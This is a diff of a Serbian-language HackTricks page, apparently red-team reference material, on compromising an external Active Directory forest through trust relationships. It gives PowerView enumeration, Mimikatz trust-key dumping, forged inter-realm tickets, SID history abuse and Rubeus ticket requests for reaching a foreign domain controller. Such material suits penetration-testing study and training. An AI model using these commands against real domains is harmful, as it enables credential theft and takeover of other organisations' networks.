@@ -1,22 +1,25 @@
-# Spoljni šumski domen - Jednosmerno (ulazni) ili dvosmerno
+# Eksterni šumski domen - Jednosmerni (ulazni) ili dvosmerni
+
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
 
-U ovom scenariju spoljni domen vam veruje (ili se međusobno veruju), tako da možete dobiti neku vrstu pristupa nad njim.
+U ovom scenariju eksterni domen vam veruje (ili se oboje međusobno veruju), tako da možete dobiti neku vrstu pristupa.
 
 ## Enumeracija
 
-Prvo od svega, morate **enumerisati** **poverenje**:
+Prvo, morate **enumerisati** **povjerenje**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -66,13 +69,13 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-U prethodnom nabrajanju je utvrđeno da je korisnik **`crossuser`** unutar grupe **`External Admins`** koji ima **Admin pristup** unutar **DC-a spoljnog domena**.
+U prethodnoj enumeraciji je otkriveno da je korisnik **`crossuser`** unutar grupe **`External Admins`** koja ima **Admin pristup** unutar **DC-a spoljnog domena**.
 
 ## Početni pristup
 
-Ako **niste** pronašli nikakav **poseban** pristup vašeg korisnika u drugom domenu, i dalje možete se vratiti na AD metodologiju i pokušati **privesc sa neprivilegovanog korisnika** (kao što je na primer kerberoasting):
+Ako **niste mogli** da pronađete bilo kakav **poseban** pristup vašeg korisnika u drugom domenu, još uvek možete da se vratite na AD metodologiju i pokušate da **privesc od korisnika bez privilegija** (stvari poput kerberoasting-a na primer):
 
-Možete koristiti **Powerview funkcije** za **nabrajanje** drugog domena koristeći `-Domain` parametar kao u primeru:
+Možete koristiti **Powerview funkcije** da **enumerate** **drugi domen** koristeći `-Domain` parametar kao u:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -80,19 +83,19 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 [.](./)
 {% endcontent-ref %}
 
-## Impersonacija
+## Imitacija
 
 ### Prijavljivanje
 
-Korišćenjem redovne metode sa pristupnim podacima korisnika koji ima pristup spoljnom domenu, trebali biste moći da pristupite:
+Korišćenjem uobičajenog metoda sa akreditivima korisnika koji ima pristup spoljašnjem domenu, trebali biste moći da pristupite:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### Zloupotreba SID istorije
+### SID History Abuse
 
-Takođe možete zloupotrebiti [**SID istoriju**](sid-history-injection.md) preko poverenja između šuma.
+Možete takođe zloupotrebiti [**SID History**](sid-history-injection.md) preko šume poverenja.
 
-Ako se korisnik migrira **iz jednog šuma u drugi** i **SID filtriranje nije omogućeno**, postaje moguće **dodati SID iz drugog šuma**, i ovaj **SID** će biti **dodat** u **korisnikov token** prilikom autentifikacije **preko poverenja**.
+Ako je korisnik migriran **iz jedne šume u drugu** i **SID filtriranje nije omogućeno**, postaje moguće **dodati SID iz druge šume**, i ovaj **SID** će biti **dodato** u **token korisnika** prilikom autentifikacije **preko poverenja**.
 
 {% hint style="warning" %}
 Kao podsetnik, možete dobiti ključ za potpisivanje sa
@@ -101,7 +104,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Možete **potpisati** **pouzdanim** ključem **TGT impersonating** korisnika trenutne domene.
+Možete **potpisati** sa **pouzdanom** ključem **TGT koji se pretvara** u korisnika trenutnog domena.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -112,19 +115,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Potpuno preuzimanje identiteta korisnika
-
-U ovom scenariju, napadač ima potpunu kontrolu nad korisnikovim nalogom i može se predstavljati kao taj korisnik. Ovo omogućava napadaču da pristupi svim resursima i privilegijama koje korisnik ima.
-
-Da biste izvršili ovu tehniku, pratite sledeće korake:
-
-1. Napadač preuzima korisnikovu lozinku ili koristi tehnike kao što su "phishing" ili "password spraying" da bi je otkrio.
-2. Napadač se prijavljuje na sistem koristeći korisnikove legitimne kredencijale.
-3. Nakon prijave, napadač ima potpunu kontrolu nad korisnikovim nalogom i može izvršavati sve radnje koje korisnik može.
-4. Napadač može pristupiti svim resursima koji su dostupni korisniku, uključujući fajlove, mrežne resurse i privilegije.
-5. Napadač može izvršavati bilo koje akcije u ime korisnika, uključujući slanje e-pošte, pristupanje aplikacijama i manipulaciju podacima.
-
-Važno je napomenuti da je ova tehnika ilegalna i da se koristi samo u okviru etičkog hakovanja ili testiranja bezbednosti sistema uz dozvolu vlasnika sistema.
+### Potpuni način imitiranja korisnika
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -138,14 +129,17 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
